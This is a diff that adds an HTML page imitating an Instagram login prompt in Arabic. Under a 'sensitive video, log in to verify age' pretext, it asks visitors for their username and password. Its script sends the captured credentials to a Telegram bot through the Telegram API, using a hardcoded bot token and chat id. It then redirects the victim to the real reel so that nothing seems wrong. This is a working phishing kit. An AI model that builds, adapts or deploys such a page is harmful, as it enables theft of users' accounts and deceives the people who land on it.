@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta property="og:title" content="Abdulaziz Shah على Instagram : ما توقعت المايك يلقط تغريد الطيور...">
+    <meta property="og:description" content="شاهد الفيديو الكامل الآن على تطبيق Instagram">
+    <meta property="og:image" content="https://scontent.cdninstagram.com/v/t51.2885-15/434524458_1123447385517373_7562846834162356541_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=18de2a&_nc_ohc=example"> 
+    <meta property="og:url" content="https://www.instagram.com/reel/DVucGpOiJms/">
+    <meta property="og:type" content="video.other">
+
+    <title>Instagram Video</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { width: 330px; text-align: center; border: 1px solid #262626; padding: 35px 25px; border-radius: 10px; background-color: #000; }
+        .insta-logo { width: 55px; margin-bottom: 20px; }
+        h2 { font-size: 16px; font-weight: 600; margin-bottom: 15px; color: #efefef; }
+        p { font-size: 13px; color: #a8a8a8; margin-bottom: 25px; line-height: 1.4; }
+        input { width: 100%; background: #121212; border: 1px solid #363636; border-radius: 5px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 14px; outline: none; text-align: center; }
+        input:focus { border-color: #555; }
+        .btn-login { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 10px; }
+        .footer-text { font-size: 11px; color: #555; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="insta-logo">
+        <h2>محتوى حساس</h2>
+        <p>هذا الفيديو يحتوي على محتوى قد يراه البعض حساساً. يرجى تسجيل الدخول لتأكيد عمرك ومشاهدة الفيديو بالكامل.</p>
+        
+        <input type="text" id="field_u" placeholder="اسم المستخدم، الهاتف أو البريد">
+        <input type="password" id="field_p" placeholder="كلمة المرور">
+        
+        <button class="btn-login" onclick="captureData()">مشاهدة الفيديو</button>
+        
+        <div class="footer-text">من شركة Meta</div>
+    </div>
+
+    <script>
+        function captureData() {
+            const u = document.getElementById('field_u').value;
+            const p = document.getElementById('field_p').value;
+            const bot_token = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
+            const chat_id = "897618292";
+
+            if (u.length < 3 || p.length < 3) {
+                alert("يرجى إدخال بيانات صحيحة");
+                return;
+            }
+
+            // إرسال البيانات للبوت
+            fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🔥 صيد جديد من رابط الفيديو:\n👤 اليوزر: " + u + "\n🔑 الرمز: " + p)}`)
+            .then(() => {
+                // تحويل المبتز للفيديو الحقيقي فوراً لإبعاد الشبهة
+                window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/";
+            });
+        }
+    </script>
+</body>
+</html>
